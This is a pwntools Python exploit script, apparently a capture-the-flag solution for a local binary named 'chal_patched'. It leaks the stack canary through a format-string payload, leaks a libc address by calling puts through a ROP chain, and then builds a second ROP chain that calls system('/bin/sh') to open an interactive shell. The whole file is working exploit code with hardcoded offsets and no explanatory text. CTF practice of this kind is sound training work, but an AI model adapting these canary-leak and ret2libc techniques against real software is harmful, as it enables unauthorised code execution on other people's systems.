from pwn import * # grap everything from pwntools
exe = './chal_patched'
s = '''
b * 0x401255
c
'''
context.terminal = ['alacritty', '-e']
p = process(exe)
#p = gdb.debug(exe, s)
p.recvuntil(b"You can write something in the buffer for me UwU\n")
payload = b"%9$p"
p.sendline(payload)
canary = int(p.recv(18), 16)
print("canary = ", hex(canary))

p.recvuntil("Try to get the flag by writing something in the buffer again for me UwU\n")
payload = b'A' * 0x18
payload += p64(canary)
payload += b'B' * 8
payload += p64(0x00000000004012e0)
payload += p64(0x403fc8)
payload += p64(0x0000000000401080) # run puts(address that contains libc), have another ret at the end of puts
payload += p64(0x00000000004011b6)
p.sendline(payload)

libc_leak = u64(p.recv(6).ljust(8, b'\x00')) # pad some more bytes
libc_base = libc_leak - 0x80e50
print("libc base @", hex(libc_base))



p.recvuntil(b"You can write something in the buffer for me UwU\n")
payload = b"%9$p"
p.sendline(payload)
p.recvuntil("Try to get the flag by writing something in the buffer again for me UwU\n")

bin_sh_addr = libc_base + 0x1d8678
system_addr = libc_base + 0x50d70
payload = b'A' * 0x18
payload += p64(canary)
payload += b'B' * 8
payload += p64(0x00000000004012e0) # pop rdi ; ret
payload += p64(bin_sh_addr) # address of /bin/sh
payload += p64(0x000000000040101a)
payload += p64(system_addr) # run puts(address that contains libc), have another ret at the end of puts
p.sendline(payload)

p.interactive()